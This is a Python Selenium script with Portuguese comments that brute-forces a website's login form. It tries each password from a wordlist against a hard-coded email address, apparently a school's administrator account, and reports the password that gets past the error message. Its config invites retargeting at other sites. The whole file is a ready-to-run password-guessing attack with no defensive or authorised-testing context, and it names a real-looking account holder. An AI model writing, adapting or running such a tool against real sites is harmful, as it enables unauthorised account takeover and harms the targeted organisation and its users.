from selenium import webdriver
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
import time

# --- CONFIGURAÇÕES DE ALVO (Altere aqui para outros sites) ---
CONFIG = {
    "url": "url do site",
    "usuario": "escola.sonhoencantado@hotmail.com",
    "tipo_user": "ADM",
    "wordlist": "senhas.txt",
    # Seletores CSS (Altere conforme o HTML do site alvo)
    "sel_email": "input[name='email']", 
    "sel_senha": "input[name='senha']",
    "sel_tipo": "input[name='tipo_usuario']",
    "sel_botao": "input[name='btLogar']",
    "msg_erro": "Usuário e/ou Senha inválidos!"
}

def brute_force():
    # Configurações do Firefox
    options = Options()
    # options.add_argument("--headless") # Descomente para rodar sem abrir a janela
    
    driver = webdriver.Firefox(options=options)
    print(f"Iniciando navegador em: {CONFIG['url']}")

    try:
        with open(CONFIG["wordlist"], "r") as file:
            for line in file:
                senha = line.strip()
                
                driver.get(CONFIG["url"])
                
                # Preenchimento dos campos usando os seletores configurados
                driver.find_element(By.CSS_SELECTOR, CONFIG["sel_email"]).send_keys(CONFIG["usuario"])
                driver.find_element(By.CSS_SELECTOR, CONFIG["sel_tipo"]).send_keys(CONFIG["tipo_user"])
                driver.find_element(By.CSS_SELECTOR, CONFIG["sel_senha"]).send_keys(senha)
                
                # Clique no botão de login
                driver.find_element(By.CSS_SELECTOR, CONFIG["sel_botao"]).click()
                
                # Pequena pausa para carregamento da página
                time.sleep(0.5)

                print(f"Testando: {senha}", end="\r")

                # Verifica se a mensagem de erro está AUSENTE na página
                if CONFIG["msg_erro"] not in driver.page_source:
                    print(f"\n\n[+] ACESSO CONSEGUIDO: {senha}")
                    return senha
                    
    except FileNotFoundError:
        print("\nErro: Arquivo de senhas não encontrado.")
    except Exception as e:
        print(f"\nErro durante a execução: {e}")
    finally:
        driver.quit()

if __name__ == "__main__":
    brute_force()
